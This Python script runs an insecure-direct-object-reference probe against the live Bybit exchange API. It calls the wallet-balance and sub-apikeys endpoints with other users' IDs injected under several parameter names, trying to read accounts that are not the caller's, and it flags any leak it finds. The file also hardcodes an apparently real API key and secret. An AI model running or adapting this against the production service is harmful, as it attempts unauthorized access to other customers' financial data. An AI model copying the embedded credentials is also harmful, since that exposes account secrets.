#!/usr/bin/env python3
import subprocess
import time
import hmac
import hashlib
import json

# Configuration
API_KEY = "22JSr5zWpW0eReC6rE"
API_SECRET = "QZhQLj0tXsbSeTHYHnvoB99GKILfFdMkzWYN"
BASE_URL = "https://api.bybit.com" # MAINNET
MY_UID = "527465456"

def get_server_time():
    try:
        cmd = ["curl", "-s", f"{BASE_URL}/v5/market/time"]
        result = subprocess.run(cmd, capture_output=True, text=True)
        data = json.loads(result.stdout)
        return int(data['time'])
    except:
        return int(time.time() * 1000)

OFFSET = get_server_time() - int(time.time() * 1000)
print(f"Time offset: {OFFSET}ms")

def get_signature(payload, api_secret):
    return hmac.new(
        bytes(api_secret, "utf-8"), 
        bytes(payload, "utf-8"), 
        hashlib.sha256
    ).hexdigest()

def send_request(method, endpoint, payload=None):
    if payload is None:
        payload = {}
        
    timestamp = str(int(time.time() * 1000) + OFFSET)
    recv_window = "5000"
    
    if method == "GET":
        params_str = "&".join([f"{k}={v}" for k, v in sorted(payload.items())])
        sign_payload = f"{timestamp}{API_KEY}{recv_window}{params_str}"
        full_url = f"{BASE_URL}{endpoint}?{params_str}"
    else:
        # POST not used in safe mode
        return {}
    
    signature = get_signature(sign_payload, API_SECRET)
    
    headers = [
        "-H", f"X-BAPI-API-KEY: {API_KEY}",
        "-H", f"X-BAPI-SIGN: {signature}",
        "-H", "X-BAPI-SIGN-TYPE: 2",
        "-H", f"X-BAPI-TIMESTAMP: {timestamp}",
        "-H", f"X-BAPI-RECV-WINDOW: {recv_window}",
        "-H", "Content-Type: application/json"
    ]
    
    cmd = ["curl", "-s"] + headers + [full_url]
    
    try:
        result = subprocess.run(cmd, capture_output=True, text=True)
        return json.loads(result.stdout)
    except:
        return {}

print("="*80)
print("MAINNET IDOR SCAN (SAFE MODE)")
print("="*80)

# 1. Baseline Check
print("\n[1] Baseline Check (My Info)")
res = send_request("GET", "/v5/user/query-api")
if res.get('retCode') == 0:
    print("✅ Keys working. User Info:")
    result = res.get('result', {})
    print(f"  ID: {result.get('userID')}")
    print(f"  Note: {result.get('note')}")
    print(f"  Permissions: Verified")
else:
    print(f"❌ Failed: {res}")
    exit()

# 2. IDOR on Wallet Balance
print("\n[2] Testing IDOR on Wallet Balance")
targets = [
    str(int(MY_UID) - 1),
    str(int(MY_UID) + 1),
    "1", "888888"
]

params_to_test = ["uid", "memberId", "userId", "targetUid", "subMemberId"]

for target in targets:
    for param in params_to_test:
        # payload = {"accountType": "UNIFIED", param: target}
        # Bybit requires accountType.
        # Try to access wallet with injecting target param
        
        # print(f"Testing {param}={target} ...", end="\r")
        res = send_request("GET", "/v5/account/wallet-balance", {"accountType": "UNIFIED", param: target})
        
        if res.get('retCode') == 0:
            # Check if response contains TARGET uid
            res_str = json.dumps(res)
            if f'"{target}"' in res_str or f':{target}' in res_str or f': {target}' in res_str:
                print(f"\n🚨 POTENTIAL IDOR! Found target {target} in response!")
                print(f"  Param: {param}")
                print(f"  Response: {res_str[:200]}")
            else:
                # Likely ignored the param and returned OWN data
                pass
        else:
            # Error (likely permission denied or invalid param)
            pass

print("\n[3] Testing Sub-Account Information Leak")
# Try to query sub-uid list with 'uid' param
res = send_request("GET", "/v5/user/sub-apikeys", {"uid": targets[0]})
if res.get('retCode') == 0:
     print("🚨 /v5/user/sub-apikeys accepted 'uid' param!")
     print(res)
else:
     print(f"  /v5/user/sub-apikeys safe: {res.get('retCode')}")

print("\n" + "="*80)
print("SCAN COMPLETE")
